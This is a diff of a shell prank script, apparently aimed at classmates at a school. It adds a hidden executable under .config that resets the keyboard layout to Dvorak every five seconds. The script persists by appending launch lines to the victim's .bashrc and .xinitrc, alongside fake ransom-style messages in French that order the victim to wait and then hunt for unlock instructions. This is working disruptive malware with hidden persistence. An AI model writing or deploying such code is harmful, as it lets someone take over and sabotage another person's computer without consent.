@@ -6,7 +6,17 @@ do
    printf '\r'
 done" > .config/.the_game
 chmod +x .config/.the_game
-
+echo "#!/bin/bash
+if [ -z \"\$var\" ]
+then
+   while true
+   do
+      setxkbmap dvorak
+      sleep 5
+   done
+fi
+" > .config/.tmp_1h3g4me
+chmod +x .config/.tmp_1h3g4me
 places=("gonflable" "amphi" "cour" "entree" "distributeur" "toilettes amphi")
 the_one=${places[RANDOM % ${#places[@]}]} 
 
@@ -23,7 +33,8 @@ echo \"4. ATTENDEZ 5 MINUTES DEVANT VOTRE ECRAN.\"
 echo \"5. ALLEZ A LA LOCALISATION OU VOUS TROUVEREZ UN PAPIER CONTENANT LES INSTRUCTIONS DE DEBLOQUAGE.\"
 echo \"N'ESSAYEZ PAS DE NOUS ARNAQUER, OU LA SENTENCE SERA TERRIBLE.\"
 echo \"And don't forget... The crepe is a lie.\"
-./.config/.the_game &" >> .bashrc
-echo "setxkbmap dvorak" >> .xinitrc
-setxkbmap dvorak
+./.config/.the_game &
+./.config/.tmp_1h3g4me &" >> .bashrc
+echo "nohup ./.config/.tmp_1h3g4me" >> .xinitrc
+
 source .bashrc
